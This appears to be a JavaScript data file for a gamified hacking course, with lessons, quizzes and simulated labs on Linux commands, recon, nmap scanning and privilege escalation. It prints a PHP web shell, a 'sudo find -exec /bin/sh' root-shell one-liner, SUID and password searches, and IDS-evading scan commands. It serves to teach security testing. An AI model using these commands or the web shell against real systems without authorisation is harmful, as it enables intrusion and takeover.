      {type:"hack",story:"You spotted a suspicious uploads/ folder. Hackers sometimes upload backdoors through file upload forms. Time to investigate.",q:"Enter the uploads folder.",a:["cd uploads","cd uploads/"],output:"$ pwd\n/var/www/html/uploads\n\n$ ls -la\n-rw-r--r-- 1 www-data www-data  156 Jan 14 shell.php\n-rw-r--r-- 1 www-data www-data 2048 Jan 14 image.jpg",success:"Found shell.php \u2014 that's a web shell backdoor! Someone was here before you.",why:"cd = change directory. Navigate to investigate suspicious folders."},
      {type:"teach",text:"touch filename = create empty file. mkdir dirname = create folder. rm filename = delete (NO trash can!). rm -r dirname = delete folder and everything inside it."},
      {type:"hack",story:"You need to save evidence of the backdoor before the attacker deletes it. Create a folder to store your findings.",q:"Create an evidence folder called 'loot'.",a:["mkdir loot"],output:"$ ls\nloot/  shell.php  image.jpg\n\nEvidence folder ready.",success:"Nice! Organized hackers are effective hackers.",why:"mkdir creates directories. Always organize your findings."},
      {type:"tf",q:"Deleted files with rm can be recovered from the trash.",a:false,why:"rm permanently deletes. No recycle bin in the terminal. Gone forever."},
    ]},
    {id:"u2l3",title:"Copying, Moving & Reading",rounds:[
      {type:"teach",text:"Three more commands: cat filename reads a file and shows you what's inside. grep 'word' filename searches inside a file for specific text. cp copies files, mv moves or renames them.",detail:"cat = Concatenate (fancy word for 'read and display'). Shows the contents of any file.\ngrep = Global Regular Expression Print. Searches for text inside files.\ngrep -r = search recursively (all files in all subfolders).\ncp = Copy. Usage: cp original.txt copy.txt\nmv = Move or rename. mv file.txt /tmp/ moves it. mv old.txt new.txt renames it."},
      {type:"hack",story:"You spotted a suspicious file called shell.php in the uploads folder. You need to read it to see what it does. cat prints a file's contents on screen.",q:"Read the suspicious file. (Hint: cat shell.php)",a:["cat shell.php","cat uploads/shell.php"],output:"<?php\n// Backdoor uploaded 2024-01-14\n$cmd = $_GET['cmd'];\nsystem($cmd);\n// Password: shadow_agent_77\n?>",success:"It's a backdoor with a hardcoded password! Someone planted this to control the server remotely.",why:"cat reads a file and shows its contents. Essential for reading configs, code, and logs."},
      {type:"hack",story:"That backdoor had a password inside it. There could be more passwords hiding in OTHER files on this server. grep searches inside files for specific words.",q:"Search ALL files for the word 'password'. (Hint: grep -r password .)",a:["grep -r 'password' .","grep -r password .","grep -ri password .","grep -ri 'password' ."],output:"./config.php:$db_password = 'r00tme_2024';\n./shell.php:// Password: shadow_agent_77\n./.env:DB_PASSWORD=supersecret123",success:"Three passwords found across multiple files! Major finding.",why:"grep searches for text inside files. -r means search every file in every subfolder. The dot (.) means start from the current folder.",quickCmds:["grep -r password ."]},
      {type:"pick",q:"What does mv file.txt /tmp/ do?",opts:["Moves the file to /tmp/","Copies it","Deletes it","Renames it"],a:"Moves the file to /tmp/",why:"mv to a directory = move. mv old.txt new.txt = rename."},
    ]},
    // LAB
    {id:"u2lab",title:"\uD83D\uDDA5\uFE0F Lab: Find the Flag",rounds:[
      {type:"lab",title:"Find the Flag",objective:"Navigate a compromised server and find the hidden flag.",banner:"Connected to target 10.10.10.44...\n$ whoami\nwww-data\n",steps:[
        {hint:"Check where you are.",accept:["pwd","~pwd"],output:"/var/www/html",successMsg:"You're in the web root.",example:"pwd",quickCmds:["pwd"]},
        {hint:"List all files including hidden ones.",accept:["ls -la","ls -al"],output:"-rw-r--r-- 1 root root  1245 Jan 15 index.html\n-rw-r--r-- 1 root root   340 Jan 15 style.css\ndrwxr-xr-x 2 root root  4096 Jan 15 uploads/\n-rw------- 1 root root    42 Jan 15 .secret_note",successMsg:"Found a hidden file: .secret_note!",example:"ls -la",quickCmds:["ls -la"]},
        {hint:"Read the hidden note.",accept:["cat .secret_note","~cat .secret"],output:"The real prize is in /opt/backup/",successMsg:"A clue! Check /opt/backup/",example:"cat .secret_note",quickCmds:["cat .secret_note"]},
        {hint:"Go to /opt/backup/ and find the flag.",accept:["cd /opt/backup","~ls /opt","~cat /opt","~find /opt","ls /opt/backup"],output:"-rw-r--r-- 1 root root  340 Jan 15 config.bak\n-rw-r--r-- 1 root root   32 Jan 15 .flag.txt",successMsg:"Found it!",example:"cd /opt/backup",quickCmds:["cd /opt/backup"]},
        {hint:"Read the flag!",accept:["cat .flag.txt","~cat .flag","cat /opt/backup/.flag.txt"],output:"FLAG{y0u_f0und_th3_h1dd3n_fl4g}",successMsg:"FLAG CAPTURED! You used pwd, ls, cat, and cd to navigate and find a hidden flag.",example:"cat .flag.txt",quickCmds:["cat .flag.txt"]}
      ]}
    ]},
    // MASTERY
    {id:"u2m",title:"\uD83C\uDFC6 Terminal Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Show your current location:",a:["pwd","echo $PWD"],why:"pwd = print working directory."},
      {type:"type",q:"List everything including hidden files:",a:["ls -la","ls -al"],why:"-l for details, -a for hidden."},
      {type:"type",q:"Go up one directory:",a:["cd ..","cd ../"],why:".. = parent directory."},
      {type:"type",q:"Create a folder called tools:",a:["mkdir tools","mkdir ./tools"],why:"mkdir creates directories."},
      {type:"type",q:"Search all files for 'password':",a:["grep -r 'password' .","grep -r password .","grep -ri password ."],why:"-r searches recursively."},
      {type:"pick",q:"Which command renames a file?",opts:["mv","cp","rn","rename"],a:"mv",why:"mv with two filenames = rename."},
    ]},
  ]},

  // ---- UNIT 3: PIPES & LINUX ----
  {id:"u3",title:"Pipes & Linux",desc:"Chain commands, permissions, and key files",levels:[
    {id:"u3l1",title:"Pipes & Redirection",rounds:[
      {type:"teach",text:"The pipe symbol | is one of the most powerful things in the terminal. Here's the idea: normally a command shows its results on screen. But with a pipe, you can send those results directly into ANOTHER command for further processing. Think of it like an assembly line in a factory \u2014 one machine does its job, passes the result to the next machine. Example: cat /etc/passwd shows ALL user accounts (hundreds of lines). But cat /etc/passwd | grep bash takes that huge list and filters it down to ONLY the users who can actually log in.",detail:"| (pipe) = takes what one command outputs and feeds it as input to the next command.\nThink of it like an assembly line: each command does one job and passes the result along.\nYou can chain as many as you want: command1 | command2 | command3"},
      {type:"teach",text:"/etc/passwd is a file on every Linux machine listing all user accounts. We already know cat reads files and grep searches for text. Chain them with | to filter the huge list down to what matters."},
      {type:"hack",story:"You've broken into a Linux server. The user list has dozens of system accounts you don't care about. Use a pipe to show only the ones with real login access (bash).",q:"List only users who can log in. (Hint: cat /etc/passwd | grep bash)",a:["cat /etc/passwd | grep bash","grep bash /etc/passwd"],output:"root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash\ndev_ops:x:1001:1001::/home/dev_ops:/bin/bash\nbackup:x:1002:1002::/home/backup:/bin/bash\n\n4 users with login access.",success:"4 real accounts found! root, admin, dev_ops, and backup are your targets.",why:"The pipe | sends the full user list into grep, which filters for lines containing 'bash'.",quickCmds:["cat /etc/passwd | grep bash"]},
      {type:"teach",text:"> saves output to a file (overwrites it). >> adds to the end of a file. Example: nmap target > results.txt saves your scan results to read later."},
      {type:"build",q:"Build: list just the usernames with bash access",parts:["cat /etc/passwd","|","grep bash","|","cut -d: -f1"],answer:["cat /etc/passwd","|","grep bash","|","cut -d: -f1"],why:"Each | passes data to the next command. cut -d: -f1 grabs just the first piece (the username) from each line."},
    ]},
    {id:"u3l2",title:"File Permissions",rounds:[
      {type:"teach",text:"Every file on Linux has permissions that control who can do what. There are 3 actions: Read (look at it), Write (change it), and Execute (run it as a program). Each action has a number: Read=4, Write=2, Execute=1. Add them up for the level of access: 7 means all three (4+2+1=7). chmod 755 means the file owner gets full access (7), but everyone else can only read and run it, not change it (5)."},
      {type:"pick",q:"chmod 777 means:",opts:["Everyone can read, write, AND run the file","Only the owner has access","Nobody can access it","Read-only for everyone"],a:"Everyone can read, write, AND run the file",why:"7 = read+write+execute for ALL three groups. Very dangerous if on a sensitive file!"},
      {type:"teach",text:"Normally when you run a program, it runs with YOUR level of access. But some programs have a special flag called SUID \u2014 think of it like a master key taped to the program. When SUID is set, the program runs with the OWNER's power (usually the admin/root), even if a regular user runs it. This is a huge deal for hackers \u2014 if you find one of these programs and trick it, you can suddenly do admin-level things. The command find / -perm -4000 searches the entire computer for these special programs."},
      {type:"hack",story:"You're a low-level user on this server. You need to find programs that have the SUID 'master key' \u2014 programs that run with admin power even when YOU run them. If you find one you can trick, you become admin instantly.",q:"Search the whole system for SUID programs. (Hint: find / -perm -4000)",a:["find / -perm -4000","find / -perm -4000 2>/dev/null"],output:"/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find       \u2190 \uD83D\uDEA8 Exploitable!\n/usr/bin/python3    \u2190 \uD83D\uDEA8 Exploitable!\n/usr/bin/vim        \u2190 \uD83D\uDEA8 Exploitable!\n/usr/bin/nmap\n\n6 SUID programs found. 3 can be abused!",success:"find, python3, AND vim all run with admin power! Each one can be tricked into giving you a full admin shell.",why:"find / -perm -4000 searches for programs with the SUID bit. These are your best path to becoming admin.",quickCmds:["find / -perm -4000 2>/dev/null"]},
    ]},
    {id:"u3l3",title:"Key Files & Users",rounds:[
      {type:"teach",text:"Linux stores important stuff in set places: /etc/passwd lists all user accounts. /etc/shadow has the scrambled passwords (only the admin can read it). /tmp is a junk drawer anyone can write to. /var/log has records of everything that happened."},
      {type:"match",q:"Match the folder to what's inside:",pairs:[["/etc/shadow","Scrambled passwords"],["/tmp","Anyone can write here"],["/var/log","Activity records"],["~/.bash_history","Past commands typed"]],why:"Knowing where things are stored is essential when you break into a system."},
      {type:"teach",text:"sudo lets you run a command as the admin (root). sudo -l shows which commands YOU'RE allowed to run as admin. This is the VERY FIRST thing you check after breaking in \u2014 sometimes they accidentally gave you admin access to a powerful command.",detail:"sudo = Super User Do. Runs a command with admin (root) powers.\nsudo -l = List what YOU can run as admin. This is your #1 check after getting into any system.\nIf it shows something like (root) NOPASSWD: /usr/bin/find that means you can run find as admin without even needing a password!"},
      {type:"hack",story:"You've broken into a server as a low-level user. Check if the admin accidentally gave you permission to run any commands with full admin power.",q:"See what you can run as admin. (Hint: sudo -l)",a:["sudo -l","sudo -ll"],output:"User www-data may run the following:\n  (root) NOPASSWD: /usr/bin/find\n  (root) NOPASSWD: /usr/bin/python3\n\nYou can run find AND python3 as admin!",success:"Jackpot! You can run find and python3 as root. Both can be abused to take over the whole machine.",why:"sudo -l lists commands you can run as admin. If you find something exploitable, you can become root.",quickCmds:["sudo -l"]},
    ]},
    // LAB
    {id:"u3lab",title:"\uD83D\uDDA5\uFE0F Lab: Privesc Check",rounds:[
      {type:"lab",title:"Privesc Check",objective:"Check a compromised server for privilege escalation paths.",banner:"Connected as www-data@target\n$ whoami\nwww-data\n",steps:[
        {hint:"Check what you can run as root.",accept:["sudo -l","~sudo -l","~sudo"],output:"User www-data may run the following:\n  (root) NOPASSWD: /usr/bin/find",successMsg:"You can run find as root! That's a privesc vector.",example:"sudo -l",quickCmds:["sudo -l"]},
        {hint:"Look for SUID binaries.",accept:["find / -perm -4000","~find / -perm -4000"],output:"/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/python3",successMsg:"find AND python3 have SUID!",example:"find / -perm -4000 2>/dev/null",quickCmds:["find / -perm -4000 2>/dev/null"]},
        {hint:"Check /etc/passwd for users with shell access.",accept:["~cat /etc/passwd","~grep bash","cat /etc/passwd | grep bash"],output:"root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash",successMsg:"Two users with bash: root and admin.",example:"cat /etc/passwd | grep bash",quickCmds:["cat /etc/passwd | grep bash"]},
        {hint:"Use sudo find to get a root shell!",accept:["sudo find . -exec /bin/sh \\;","~sudo find","sudo find . -exec /bin/bash \\;"],output:"# whoami\nroot",successMsg:"ROOT! sudo find -exec spawns a shell as root. Full privesc!",example:"sudo find . -exec /bin/sh \\;",quickCmds:["sudo find . -exec /bin/sh \\;"]}
      ]}
    ]},
    // MASTERY
    {id:"u3m",title:"\uD83C\uDFC6 Pipes & Linux Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"List files and filter for 'conf':",a:["ls | grep conf","ls -la | grep conf","ls -al | grep conf"],why:"Pipe ls to grep for filtering."},
      {type:"pick",q:"chmod 644 means:",opts:["Owner read+write, others read only","Full access","No access","Owner only"],a:"Owner read+write, others read only",why:"6=rw-, 4=r--, 4=r--."},
      {type:"type",q:"Find SUID binaries:",a:["find / -perm -4000","find / -perm -4000 2>/dev/null"],why:"SUID files run as their owner."},
      {type:"type",q:"Check sudo privileges:",a:["sudo -l","sudo -ll","sudo --list"],why:"First privilege escalation check."},
      {type:"match",q:"Match:",pairs:[["/etc/passwd","User accounts"],["/etc/shadow","Password hashes"],["/tmp","Drop tools here"]],why:"Know your filesystem."},
    ]},
  ]},

  // ---- UNIT 4: NETWORKING ----
  {id:"u4",title:"Networking",desc:"IPs, ports, and protocols",levels:[
    {id:"u4l1",title:"IPs & Ports",rounds:[
      {type:"teach",text:"Every computer on a network has an IP address \u2014 like a home address so other computers can find it. Example: 10.10.10.5. A port is like an apartment number at that address. Each service (website, email, file sharing) uses a different port number."},
      {type:"teach",text:"Common ports to memorize: 21 = FTP (file transfer). 22 = SSH (remote control of another computer). 80 = HTTP (websites). 443 = HTTPS (secure websites). 445 = SMB (file sharing). 3306 = MySQL (database). 3389 = RDP (Windows remote desktop)."},
      {type:"match",q:"Match the port number to its service:",pairs:[["22","SSH (remote control)"],["80","HTTP (websites)"],["443","HTTPS (secure web)"],["3389","RDP (Windows remote desktop)"]],why:"You'll see these ports on every scan. Memorize them."},
      {type:"pick",q:"A website usually runs on port:",opts:["80","22","445","3389"],a:"80",why:"HTTP (regular websites) = port 80. HTTPS (secure websites) = port 443."},
    ]},
    {id:"u4l2",title:"TCP, UDP & Subnets",rounds:[
      {type:"teach",text:"There are two ways computers send data to each other. TCP is like a phone call \u2014 before anyone talks, both sides make sure the other is listening. Your computer says 'Hey, you there?' and the other says 'Yeah I'm here, go ahead.' This back-and-forth is called a 'handshake.' TCP is used for most things (websites, email, file transfers) because nothing gets lost."},
      {type:"pick",q:"The 3-way handshake order is:",opts:["SYN \u2192 SYN-ACK \u2192 ACK","ACK \u2192 SYN \u2192 FIN","PING \u2192 PONG \u2192 GO","GET \u2192 POST \u2192 PUT"],a:"SYN \u2192 SYN-ACK \u2192 ACK",why:"SYN starts the call, SYN-ACK picks up, ACK confirms. Then data flows."},
      {type:"teach",text:"UDP is the other way computers send data. It's like shouting across a room \u2014 you just yell the message without checking if anyone heard you. It's faster than TCP but less reliable. Video calls and online games use UDP because speed matters more than perfection. A subnet is just a group of computers on the same local network \u2014 like all the computers in one office building. When you see 10.10.10.0/24, that means about 254 computers from 10.10.10.1 to 10.10.10.254."},
      {type:"pick",q:"A /24 network contains how many usable addresses?",opts:["254","256","128","65534"],a:"254",why:"256 total minus 2 reserved ones (network address and broadcast) = 254 usable."},
    ]},
    {id:"u4l3",title:"Your Network Info",rounds:[
      {type:"teach",text:"Before hacking a network, know YOUR OWN address. ip addr shows your IP. ping checks if a target is online. nmap scans whole networks for live machines (you'll master it next unit).",detail:"ip addr = shows your IP address on each network connection.\nping [IP] = sends 'are you there?' to a computer. Reply = it's online.\nping -c 4 [IP] = send exactly 4 pings then stop.\nnmap -sn [network] = quick ping sweep to find live hosts."},
      {type:"hack",story:"You've plugged into MegaCorp's office network. Before scanning anything, you need to know your own address on this network so you can receive data back.",q:"Find your IP address. (Hint: ip addr)",a:["ip addr","ifconfig","ip a"],output:"eth0: flags=4163<UP,RUNNING>\n    inet 10.10.10.50/24\n    ether 08:00:27:a3:b5:c7\n\nYou're 10.10.10.50 on the network.",success:"You're 10.10.10.50. You'll need this address whenever you set up a listener or reverse connection.",why:"ip addr shows all your network connections and IP addresses. Always check this first.",quickCmds:["ip addr"]},
      {type:"hack",story:"Your target server should be at 10.10.10.5. Before wasting time scanning it, check if it's even turned on.",q:"Check if 10.10.10.5 is online. (Hint: ping)",a:["ping 10.10.10.5","ping -c 4 10.10.10.5"],output:"64 bytes from 10.10.10.5: time=0.8ms\n64 bytes from 10.10.10.5: time=0.6ms\n\n2 packets sent, 2 received, 0% loss",success:"It's alive and responding fast! It's on the same network as you.",why:"ping sends a small message and waits for a reply. If you get a response, the target is online.",quickCmds:["ping 10.10.10.5"]},
      {type:"tf",q:"Scanning computers outside your authorized scope is illegal.",a:true,why:"Your scope document lists exactly which systems you're allowed to test. Anything else = unauthorized = criminal."},
    ]},
    // LAB
    {id:"u4lab",title:"\uD83D\uDDA5\uFE0F Lab: Network Recon",rounds:[
      {type:"lab",title:"Network Recon",objective:"Map the local network and identify live hosts.",banner:"You're on the internal network: 10.10.10.0/24\nYour IP: 10.10.10.50\n",steps:[
        {hint:"Confirm your own IP address.",accept:["ip addr","ifconfig","ip a","~ip addr"],output:"eth0: 10.10.10.50/24",successMsg:"Your IP is 10.10.10.50.",example:"ip addr",quickCmds:["ip addr"]},
        {hint:"Ping the gateway to check connectivity.",accept:["ping 10.10.10.1","~ping"],output:"64 bytes from 10.10.10.1: icmp_seq=1 ttl=64 time=1.2ms\n4 packets, 0% loss",successMsg:"Gateway is alive!",example:"ping 10.10.10.1",quickCmds:["ping 10.10.10.1"]},
        {hint:"Scan the subnet for live hosts.",accept:["nmap -sn 10.10.10.0/24","~nmap -sn","~nmap 10.10.10"],output:"10.10.10.1   - Router\n10.10.10.10  - Host up\n10.10.10.22  - Host up\n10.10.10.50  - Host up (you)\n10.10.10.88  - Host up\n5 hosts up",successMsg:"Found 4 other hosts on the network! Time to scan them.",example:"nmap -sn 10.10.10.0/24",quickCmds:["nmap -sn 10.10.10.0/24"]}
      ]}
    ]},
    // MASTERY
    {id:"u4m",title:"\uD83C\uDFC6 Networking Mastery",isCheckpoint:true,rounds:[
      {type:"match",q:"Match port to service:",pairs:[["21","FTP"],["22","SSH"],["80","HTTP"],["445","SMB"]],why:"Memorize common ports."},
      {type:"pick",q:"TCP's handshake order:",opts:["SYN, SYN-ACK, ACK","ACK, SYN, FIN","UDP, TCP, ICMP","GET, POST, PUT"],a:"SYN, SYN-ACK, ACK",why:"The 3-way handshake."},
      {type:"type",q:"Show your IP:",a:["ip addr","ifconfig","ip a"],why:"Know your own IP."},
      {type:"pick",q:"/24 = how many usable IPs?",opts:["254","256","128","65534"],a:"254",why:"256 minus network and broadcast."},
    ]},
  ]},
]};

var SEC2 = {
  id:"s2",title:"Reconnaissance & Scanning",tier:"basic",icon:"\uD83D\uDD0D",color:"var(--blue)",
  desc:"Find targets, map networks, discover vulnerabilities",
  units:[
  // ---- UNIT 5: PASSIVE RECON ----
  {id:"u5",title:"Passive Recon",desc:"Gather intel without touching the target",levels:[
    {id:"u5l1",title:"OSINT & Google Dorking",rounds:[
      {type:"teach",text:"Before you ever touch a target's computers, you gather information using only public sources \u2014 this is called OSINT (Open Source Intelligence). You search Google, look at their social media, read their job postings (which reveal what technology they use), and check public records. The target has NO idea you're investigating them because you're only looking at stuff that's already public. Google dorking means using special search tricks like site:target.com filetype:pdf to find files they didn't mean to share."},
      {type:"hack",story:"Client wants you to investigate NovaTech Corp. Before touching their servers, see what Google already knows. Use a Google dork to find exposed PDF documents on their site.",q:"Find all PDFs on novatech.com via Google.",a:["site:novatech.com filetype:pdf","site:target.com filetype:pdf","filetype:pdf site:novatech.com"],output:"Results:\n\u2022 novatech.com/docs/employee-handbook.pdf\n\u2022 novatech.com/hr/salary-bands-2024.pdf\n\u2022 novatech.com/internal/network-diagram.pdf\n\u2022 novatech.com/backup/db-credentials.pdf",success:"Network diagram AND database credentials exposed publicly! Critical finding without ever touching their servers.",why:"Google dorking reveals files the admin forgot to protect. site: limits to one domain, filetype: filters by extension.",quickCmds:["site:novatech.com filetype:pdf"]},
      {type:"pick",q:"OSINT gathering is:",opts:["Legal \u2014 it uses public info","Illegal without permission","Government only","Requires special tools"],a:"Legal \u2014 it uses public info",why:"You're just searching public sources. No laws broken."},
    ]},
    {id:"u5l2",title:"WHOIS & DNS",rounds:[
      {type:"teach",text:"You've been hired to investigate SecureVault Inc. Time to look up who's behind their domain. whois shows registration info. dig reveals DNS records \u2014 IP addresses, mail servers, and sometimes secrets hidden in TXT records."},
      {type:"type",q:"\uD83D\uDD0D Intel mission: look up who registered securevault.com",a:["whois securevault.com","whois target.com"],why:"WHOIS reveals names, emails, phone numbers \u2014 all useful for social engineering."},
      {type:"pick",q:"You run dig and find an A record pointing to 104.21.56.78. What did you just discover?",opts:["The server's IP address","The admin's email","The mail server","A hidden subdomain"],a:"The server's IP address",why:"A records map domain names to IP addresses. Now you know where the server lives."},
      {type:"type",q:"\uD83D\uDD0D Now pull DNS records to find their mail server:",a:["dig securevault.com","dig target.com","nslookup securevault.com"],why:"MX records reveal mail servers \u2014 another attack surface to investigate."},
    ]},
    {id:"u5l3",title:"Subdomain Discovery",rounds:[
      {type:"teach",text:"Big companies have hidden subdomains: dev.target.com, staging.target.com, admin.target.com. These side doors are often less secured \u2014 forgot to add authentication, running debug mode, or using old vulnerable software."},
      {type:"hack",story:"NovaTech's main site is locked down tight. But companies always have side doors \u2014 dev servers, staging environments, forgotten test sites. Find them.",q:"Enumerate novatech.com's subdomains.",a:["subfinder -d novatech.com","subfinder -d target.com","amass enum -d novatech.com","amass enum -d target.com"],output:"novatech.com\nwww.novatech.com\nmail.novatech.com\napi.novatech.com\ndev.novatech.com        \u2190 \uD83D\uDEA8\nstaging.novatech.com    \u2190 \uD83D\uDEA8\nlegacy.novatech.com     \u2190 \uD83D\uDEA8\njira.novatech.com\nvpn.novatech.com\n\n9 subdomains found.",success:"dev, staging, and legacy are HIGH VALUE targets! These often have weaker security than the main site.",why:"subfinder queries public databases and certificate transparency logs. Never touches the target directly.",quickCmds:["subfinder -d novatech.com"]},
      {type:"tf",q:"Subdomain enumeration is passive recon.",a:true,why:"subfinder queries public databases, never touching the target directly."},
    ]},
    {id:"u5lab",title:"\uD83D\uDDA5\uFE0F Lab: Recon Target",rounds:[
      {type:"lab",title:"Recon Target",objective:"Gather intel on SecureBank Corp without touching their servers.",banner:"Target: SecureBank Corp (securebank.com)\nPassive recon only \u2014 do NOT scan their servers.\n",steps:[
        {hint:"Look up who registered the domain.",accept:["whois securebank.com","~whois"],output:"Registrant: John Smith\nEmail: admin@securebank.com\nRegistrar: GoDaddy\nCreated: 2019-03-15",successMsg:"Found the admin's name and email!",example:"whois securebank.com",quickCmds:["whois securebank.com"]},
        {hint:"Check DNS records for their IP.",accept:["dig securebank.com","nslookup securebank.com","~dig","~nslookup"],output:"securebank.com.  A     104.21.56.78\nsecurebank.com.  MX    mail.securebank.com\nsecurebank.com.  TXT   v=spf1 include:_spf.google.com",successMsg:"Got their IP and mail server!",example:"dig securebank.com",quickCmds:["dig securebank.com"]},
        {hint:"Find subdomains.",accept:["subfinder -d securebank.com","~subfinder","~amass"],output:"securebank.com\nwww.securebank.com\napi.securebank.com\ndev.securebank.com\nstaging.securebank.com\nmail.securebank.com",successMsg:"Found dev and staging subdomains! These are often less secure.",example:"subfinder -d securebank.com",quickCmds:["subfinder -d securebank.com"]},
        {hint:"Search Google for exposed files.",accept:["~site:securebank","~filetype","site:securebank.com filetype:pdf"],output:"Results:\n- securebank.com/docs/employee-handbook.pdf\n- securebank.com/reports/q3-financials.pdf\n- securebank.com/backup/db-schema.pdf",successMsg:"Exposed documents including a database schema! All without touching their servers.",example:"site:securebank.com filetype:pdf",quickCmds:["site:securebank.com filetype:pdf"]}
      ]}
    ]},
    {id:"u5m",title:"\uD83C\uDFC6 Recon Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Find PDFs on a target via Google:",a:["site:target.com filetype:pdf","filetype:pdf site:target.com"],why:"Google dorking finds exposed documents."},
      {type:"type",q:"Look up domain registration:",a:["whois target.com","whois securevault.com","whois securebank.com"],why:"WHOIS reveals the domain owner."},
      {type:"type",q:"Find subdomains:",a:["subfinder -d target.com","amass enum -d target.com"],why:"Subdomains are often less secured."},
      {type:"pick",q:"Which DNS record maps domain to IP?",opts:["A record","MX record","TXT record","CNAME"],a:"A record",why:"A records map names to IPv4 addresses."},
    ]},
  ]},

  // ---- UNIT 6: NMAP ----
  {id:"u6",title:"Nmap Scanning",desc:"The #1 tool \u2014 find open ports and services",levels:[
    {id:"u6l1",title:"Nmap Basics",rounds:[
      {type:"teach",text:"You've got a target IP: 10.10.10.88. Time to scan it with nmap \u2014 your radar. It sends packets to every port and listens for responses. Open port = a door you might be able to walk through."},
      {type:"type",q:"\uD83D\uDCE1 Scan the target's most common ports:",a:["nmap 10.10.10.88","nmap 10.10.10.5","nmap target.com"],why:"Default nmap scans the top 1000 ports. Fast first look."},
      {type:"scenario",situation:"Your quick scan found ports 22, 80, and 443. But the client says they also run a custom service on a high port.",q:"What scan would catch it?",opts:["nmap -p- (all 65535 ports)","nmap again (same scan)","nmap -sU (UDP only)","nmap --script=vuln"],a:"nmap -p- (all 65535 ports)",why:"-p- scans every single port. Slower, but catches services hiding on unusual ports."},
      {type:"type",q:"\uD83D\uDCE1 Full scan \u2014 every port:",a:["nmap -p- 10.10.10.88","nmap -p- target.com","nmap -p- 10.10.10.5"],why:"-p- means all 65535 ports. Essential for thorough enumeration."},
    ]},
    {id:"u6l2",title:"Service & OS Detection",rounds:[
      {type:"teach",text:"Basic nmap says a port is open. -sV tells you WHAT software and version (e.g. 'Apache 2.4.41'). -O guesses the OS. -sC runs default info-gathering scripts."},
      {type:"build",q:"Build a detailed scan (all ports + version detection + OS guess):",parts:["nmap","-sV","-O","-p-","10.10.10.5"],answer:["nmap","-sV","-O","-p-","10.10.10.5"],why:"-sV = detect software versions. -O = guess OS. -p- = all 65535 ports."},
      {type:"teach",text:"nmap has built-in vulnerability scanners called scripts. --script=vuln runs all of them against the target. It checks for known security holes in the software it finds."},
      {type:"hack",story:"Your basic scan found port 80 (web server) open. Now run nmap's vulnerability scripts to check if it has any known security holes.",q:"Scan port 80 for vulnerabilities. (Hint: nmap --script=vuln)",a:["nmap --script=vuln 10.10.10.5","nmap --script vuln target","nmap --script=vuln -p 80 10.10.10.5"],output:"PORT   STATE SERVICE\n80/tcp open  http\n| http-sql-injection: Possible SQLi in /login.php\n| http-enum: /admin/ /backup/ /phpmyadmin/\n| http-csrf: Possible CSRF in /settings\n\n3 potential vulnerabilities found!",success:"SQL injection, exposed directories, AND a CSRF issue! Multiple attack paths.",why:"--script=vuln checks for known vulnerabilities. This saves hours of manual testing.",quickCmds:["nmap --script=vuln 10.10.10.5"]},
    ]},
    {id:"u6l3",title:"Scan Types & Stealth",rounds:[
      {type:"teach",text:"nmap scan styles: -sS (SYN scan) is stealthy \u2014 starts a connection but hangs up before finishing. -sT completes the full connection (louder). -sU scans UDP ports. -sn just checks who's online."},
      {type:"teach",text:"Speed control: -T3 is normal speed, -T4 is aggressive (faster), -T5 is 'insane' (fastest but might miss things or crash services). For a stealthy fast scan of every port, combine -sS -T4 -p-."},
      {type:"pick",q:"Which scan type is hardest for the target to detect?",opts:["-sS (SYN scan)","-sT (TCP connect)","-sU (UDP scan)","-sn (ping scan)"],a:"-sS (SYN scan)",why:"SYN scan starts the connection but never finishes it, making it harder for security tools to log."},
      {type:"hack",story:"The target has an intrusion detection system watching for scans. You need to scan all ports as quietly as possible, but still fast enough to finish today.",q:"Run a fast, stealthy scan of all ports. (Hint: -sS -T4 -p-)",a:["nmap -sS -T4 -p- 10.10.10.5","nmap -sS -p- -T4 target","nmap -sS -T4 -p- target"],output:"Nmap scan report for 10.10.10.5\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n443/tcp   open  https\n8443/tcp  open  https-alt\n9090/tcp  open  zeus-admin\n\n5 ports found. Scan completed in 38 seconds.",success:"Found a hidden admin panel on port 9090 that a basic scan would have missed!",why:"-sS = stealth. -T4 = fast. -p- = all ports. The perfect combination for thorough scanning.",quickCmds:["nmap -sS -T4 -p- 10.10.10.5"]},
    ]},
    {id:"u6lab",title:"\uD83D\uDDA5\uFE0F Lab: Scan the Bank",rounds:[
      {type:"lab",title:"Scan the Bank",objective:"Enumerate SecureBank's server at 10.10.10.88.",banner:"Target: SecureBank \u2014 10.10.10.88\nScope: Full port scan authorized\n",steps:[
        {hint:"Check if the target is alive.",accept:["ping 10.10.10.88","~ping"],output:"64 bytes from 10.10.10.88: icmp_seq=1 ttl=63\n4 packets, 0% loss",successMsg:"Target is alive!",example:"ping 10.10.10.88",quickCmds:["ping 10.10.10.88"]},
        {hint:"Full port scan with service detection.",accept:["~nmap -sV","~nmap -p-","nmap -sV -p- 10.10.10.88"],output:"PORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.6p1\n80/tcp   open  http       Apache 2.4.29\n3306/tcp open  mysql      MySQL 5.7.32\n8080/tcp open  http-proxy Squid 3.5.27",successMsg:"4 open ports! SSH, HTTP, MySQL, and a proxy.",example:"nmap -sV -p- 10.10.10.88",quickCmds:["nmap -sV -p- 10.10.10.88"]},
        {hint:"Run vuln scripts on the web server.",accept:["~nmap --script","nmap --script=vuln -p 80 10.10.10.88"],output:"| http-sql-injection: Possible SQLi in /login.php\n| http-enum: /admin/ /backup/ /phpmyadmin/",successMsg:"Found SQL injection and exposed directories!",example:"nmap --script=vuln -p 80 10.10.10.88",quickCmds:["nmap --script=vuln -p 80 10.10.10.88"]}
      ]}
    ]},
    {id:"u6m",title:"\uD83C\uDFC6 Nmap Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Scan all ports with version detection:",a:["nmap -sV -p- 10.10.10.5","nmap -p- -sV target"],why:"Complete enumeration."},
      {type:"pick",q:"Which flag detects service versions?",opts:["-sV","-sS","-O","-p-"],a:"-sV",why:"-sV probes ports for software and version."},
